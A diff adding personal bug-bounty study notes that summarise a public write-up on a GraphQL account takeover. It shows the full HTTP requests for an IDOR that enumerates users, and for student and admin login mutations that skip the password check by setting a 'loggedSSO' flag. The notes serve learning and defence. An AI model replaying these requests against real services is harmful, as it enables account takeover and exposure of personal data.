@@ -71,8 +71,163 @@ https://medium.com/sourav-sahana/bypass-2fa-in-a-website-d616eaead1e3
 6. So the main logic here was: 
     6.1 The 2fa key was in the token parameter deleting it and forwarding the request woudl give any valid user password should change.
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-    
+
+OCT- 20:
+
+https://oussamarahali.com/blog/butterfly-effect-zero-click-account-takeover/
+
+      ** The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover **
+      1. The user mapped the application, and found out that it uses an GraphQL API.
+      2. Initial discovery : GraphQL suggestion 
+      3. IDOR Allowing Enumeration of Users:
+          3.1 After initial discovery of the GraphQL, the user found an IDOR bug, that allowed to enumerate all the student and administrator of the platform
+              through the student session. --> idor vetyo with multiple student and administrator with the student session.
+          3.2 Enumerate student:
+               3.2.1 POST /graphql
+                     Host: foo.target.com
+                     Authorization: Bearer [Student JWT]
+                     Content-Type: application/json
+
+                     {
+                       "operationName": "student",
+                       "variables": {},
+                       "query": "query student {\n  student(id:1234) {\n    firstName\n    lastName\n    profile\n    affiliation\n    email\n    createdAt\n    __typename\n  }\n}"
+                     }
+                 3.2.2 Response:
+                           HTTP/2 200 OK
+                           [..]
+                           
+                           {
+                             "data": {
+                               "student": {
+                                 "firstName": "Alan",
+                                 "lastName": "Turing",
+                                 "profile": "Employee",
+                                 "affiliation": "foobar",
+                                 "email": "alan.turing@student.tld",
+                                 "createdAt": "2021-05-18T17:58:21.000Z",
+                                 "__typename": "Student"
+                               }
+                             }
+                           }
+        3.3 Enumerate admin:
+            POST /graphql
+            Host: foo.target.com
+            Authorization: Bearer [Student JWT]
+            Content-Type: application/json
+            
+            {
+              "operationName": "Administrator",
+              "variables": {
+                "id": "500"
+              },
+              "query": "query Administrator($id: ID!) {\n  administrator(id: $id) {\n    id\n    firstName\n    lastName\n    email\n    adminLevel\n    trainerId\n    affiliation\n    proprietaire\n    team\n    favoriteCourses\n     specificAccessStartDate\n    specificAccessEndDate\n    __typename\n  }\n}"
+            }
+            Response: 
+                       HTTP/2 200 OK
+                       [..]
+                       
+                       {
+                         "data": {
+                           "administrator": {
+                             "id": "500",
+                             "firstName": "Linus",
+                             "lastName": "Torvalds",
+                             "email": "linus.torvalds@admin.tld",
+                             "adminLevel": 2,
+                             "trainerId": "Linus_Torvalds",
+                             "affiliation": "",
+                             "proprietaire": null,
+                             "team": null,
+                             "favoriteCourses": null,
+                             "specificAccessStartDate": null,
+                             "specificAccessEndDate": null,
+                             "__typename": "Administrator"
+                           }
+                         }
+                       }
+                                     
+
+
+       4. From here now the user keep exploring the javascript file from here he finds that: How GraphQL’s Exclamation point ! Can Mislead: 
+          When Required Fields Aren’t What They Seem
+             4.1 there he found loggedinSSO , password, mutation LoginStudent
+       5. So suprised here, giving the loggedinSSO: true will bypass the need of password --> loggedinSSO diyo vane password na dida in huncha it's bypaassed as per backend logic
+             5.1 This vulnerability arise from the fact that while the GraphQL schema defined the password field as non-nullable, the backend logic did not enforce 
+                 this constraint effectively. The presence of the loggedSSO flag bypassed the need for a password, leading to a critical authentication bypass.
+       6. Request to bypass authentication for student account: 
+                            POST /graphql
+                        Host: foo.target.tld
+                        Content-Type: application/json
+                        
+                        {
+                          "operationName": "LoginStudent",
+                          "variables": {
+                            "email": "alan.turing@student.tld",
+                            "password": "",             --> look password is null 
+                            "loggedSSO": true                --> and this sets true , having this as true we don't need a password there
+                          },
+                          "query": "mutation LoginStudent($email: String, $uid: String, $password: String, $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginStudent(\n    email: $email\n    uid: $uid\n    password: $password\n    loggedSSO: $loggedSSO\n    dataToUpdate: $dataToUpdate\n  )\n}"
+                        }
+                
+                 Response: 
+               HTTP/2 200 OK
+                [..]
+                
+                {
+                  "data": {
+                    "loginStudent": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwiZW1haWwiOiJhbGFuLnR1cmluZ0BzdHVkZW50LnRsZCIsImFmZmlsaWF0aW9uIjoidGFyZ2V0IiwiaWF0IjoxNzIxMjI2OTIwLCJleHAiOjE3MjkwMDI5MjB9.rCRntgXZmuqeaAv_l0w5SvTGiXnpTS62qiboaq-o5sc"
+                  }
+                }
+
+                 6.1 So with this token the user has controlled over the student account ----> look just having student email with no password we can have any student details
+      7.  Authentication Bypass: Admin - Leveraging GraphQL Suggestions for Admin Access: 
+             7.1 Till now we can have any student details having only email of their, so the user thought that having admin email we can access it to right 
+             7.2 He tried with admin email but the server return the session token OK, but using that token the user was not able to access the administrator feture.
+     8. Now the error message comes in hady here : 
+           8.1 OperationName : LoginAdmin --> this shows error in response like: Cannot query field “LoginAdmin” on type “Mutation”. Did you mean “loginAdmin” or “signupAdmin” ?)
+           8.2 So we need to login as admin trying : loginAdmin will solve our problem
+    9. POST /graphql
+       Host: foo.target.tld
+       Content-Type: application/json
+       
+       {
+         "operationName": "loginAdmin",
+         "variables": {
+           "email": "linus.torvalds@admin.tld",
+           "password": "",
+           "loggedSSO": true
+         },
+         "query": "mutation loginAdmin($email: String, $uid: String, $password: String, $loggedSSO: Boolean!, $dataToUpdate: String) {\n  loginAdmin(\n    email: $email\n    uid: $uid\n    password: $password\n    loggedSSO: $loggedSSO\n    dataToUpdate: $dataToUpdate\n  )\n}"
+       }
+      RESPONSE: 
+      HTTP/2 200 OK
+        [..]
+        
+        {
+          "data": {
+            "loginAdmin": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAwLCJlbWFpbCI6ImxpbnVzLnRvcnZhbGRzQGFkbWluLnRsZCIsImFkbWluTGV2ZWwiOjIsImlhdCI6MTcyMTMwMjMyNywiZXhwIjoxNzIzODk0MzI3fQ.xd-9Jf9OlBlWAc-H_DuU-WiK1dEj1UbYwCPnPWiT8Mk"
+          }
+        }
+        
+  10. Ok with this token the user have the full control as a admin too
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
